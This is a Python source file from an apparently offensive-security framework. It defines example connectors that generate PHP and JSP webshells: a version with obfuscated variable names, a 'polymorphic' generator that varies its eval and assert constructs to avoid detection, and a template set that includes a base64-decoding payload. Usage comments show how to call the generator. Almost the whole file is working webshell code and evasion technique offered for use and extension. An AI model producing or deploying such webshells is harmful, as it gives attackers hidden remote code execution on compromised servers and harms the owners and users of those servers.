"""Example webshell connectors for reference and extension."""

from typing import Optional
from ofx.data.webshell.connectors.base import WebshellConnector


class ExampleObfuscatorConnector(WebshellConnector):
    """Example: Obfuscated webshell generator.
    
    Demonstrates how to create a custom connector that adds
    obfuscation to generated webshells.
    """
    
    def __init__(self):
        super().__init__(
            name="example-obfuscator",
            description="Example obfuscated webshell generator"
        )
    
    def generate(
        self,
        language: str,
        password: str = "pass",
        encoder: str = "default",
        secret_header: Optional[str] = None,
        secret_value: Optional[str] = None,
        inline: bool = False,
        **kwargs
    ) -> str:
        """Generate obfuscated webshell.
        
        This is a simple example - real obfuscation would be more complex.
        """
        self.validate_params(language, password, encoder)
        
        if language.lower() == 'php':
            # Example: Simple variable name obfuscation
            var_names = {
                'password': self._obfuscate_name('password'),
                'eval': self._obfuscate_name('eval'),
                'post': self._obfuscate_name('post'),
            }
            
            code = f"""
            ${var_names['post']} = $_POST;
            ${var_names['password']} = '{password}';
            if(isset(${var_names['post']}[${var_names['password']}])){{
                {var_names['eval']}(${var_names['post']}[${var_names['password']}]);
            }}
            """
            
            if inline:
                code = code.replace('\n', ' ').replace('  ', ' ')
            
            return f"<?php {code} ?>"
        
        # Fallback to basic template for other languages
        return f"<?{language} // Example connector - implement {language} support ?>"
    
    def _obfuscate_name(self, name: str) -> str:
        """Simple name obfuscation (example only)."""
        # Real implementation would use more sophisticated obfuscation
        import hashlib
        return hashlib.md5(name.encode()).hexdigest()[:8]
    
    def get_supported_languages(self) -> list:
        """This example only supports PHP."""
        return ['php']


class ExamplePolymorphicConnector(WebshellConnector):
    """Example: Polymorphic webshell generator.
    
    Generates different code structure on each call while maintaining
    the same functionality.
    """
    
    def __init__(self):
        super().__init__(
            name="example-polymorphic",
            description="Example polymorphic webshell generator"
        )
        self._generation_count = 0
    
    def generate(
        self,
        language: str,
        password: str = "pass",
        encoder: str = "default",
        secret_header: Optional[str] = None,
        secret_value: Optional[str] = None,
        inline: bool = False,
        **kwargs
    ) -> str:
        """Generate polymorphic webshell."""
        self.validate_params(language, password, encoder)
        
        self._generation_count += 1
        
        if language.lower() == 'php':
            # Alternate between different code structures
            if self._generation_count % 3 == 0:
                code = f"<?php eval($_POST['{password}']); ?>"
            elif self._generation_count % 3 == 1:
                code = f"<?php @array_map('assert', (array)$_POST['{password}']); ?>"
            else:
                code = f"<?php $f='eva'.'l'; $f($_POST['{password}']); ?>"
            
            return code
        
        return f"<?{language} // Polymorphic - gen #{self._generation_count} ?>"
    
    def get_supported_languages(self) -> list:
        """This example only supports PHP."""
        return ['php']


class ExampleCustomTemplateConnector(WebshellConnector):
    """Example: Custom template-based connector.
    
    Shows how to use custom templates with placeholder replacement.
    """
    
    def __init__(self):
        super().__init__(
            name="example-custom-template",
            description="Example custom template connector"
        )
        
        # Define custom templates
        self._templates = {
            'php': {
                'default': '<?php @eval($_POST["{{PASSWORD}}"]); ?>',
                'base64': '<?php @eval(base64_decode($_POST["{{PASSWORD}}"])); ?>',
                'custom': '''<?php
                    $key = "{{PASSWORD}}";
                    if(isset($_POST[$key])){
                        eval($_POST[$key]);
                    }
                ?>''',
            },
            'jsp': {
                'default': '<%@ page import="java.io.*" %><% eval(request.getParameter("{{PASSWORD}}")); %>',
            }
        }
    
    def generate(
        self,
        language: str,
        password: str = "pass",
        encoder: str = "default",
        secret_header: Optional[str] = None,
        secret_value: Optional[str] = None,
        inline: bool = False,
        **kwargs
    ) -> str:
        """Generate webshell from custom template."""
        self.validate_params(language, password, encoder)
        
        lang = language.lower()
        
        if lang not in self._templates:
            raise ValueError(f"Language '{language}' not supported by this connector")
        
        templates = self._templates[lang]
        template = templates.get(encoder, templates.get('default', ''))
        
        if not template:
            raise ValueError(f"No template found for encoder '{encoder}'")
        
        # Replace placeholders
        code = template.replace('{{PASSWORD}}', password)
        
        if secret_header and secret_value:
            code = code.replace('{{SECRET_HEADER}}', secret_header)
            code = code.replace('{{SECRET_VALUE}}', secret_value)
        
        if inline:
            code = code.replace('\n', ' ').replace('\t', ' ')
            code = ' '.join(code.split())  # Collapse spaces
        
        return code
    
    def get_supported_languages(self) -> list:
        """Return languages with templates defined."""
        return list(self._templates.keys())
    
    def get_supported_encoders(self, language: str) -> list:
        """Return encoders for a language."""
        lang = language.lower()
        if lang in self._templates:
            return list(self._templates[lang].keys())
        return []


# To use these examples:
#
# 1. Copy this file or create your own in the same directory
# 2. Implement the generate() method
# 3. The connector will be auto-discovered
#
# Example usage:
#
#   from ofx.api.webshell import generate_webshell
#   
#   # Use example obfuscator
#   shell = generate_webshell('php', password='x', connector_name='example-obfuscator')
#   
#   # Use polymorphic generator
#   shell1 = generate_webshell('php', password='x', connector_name='example-polymorphic')
#   shell2 = generate_webshell('php', password='x', connector_name='example-polymorphic')
#   # shell1 != shell2 (different structure, same function)
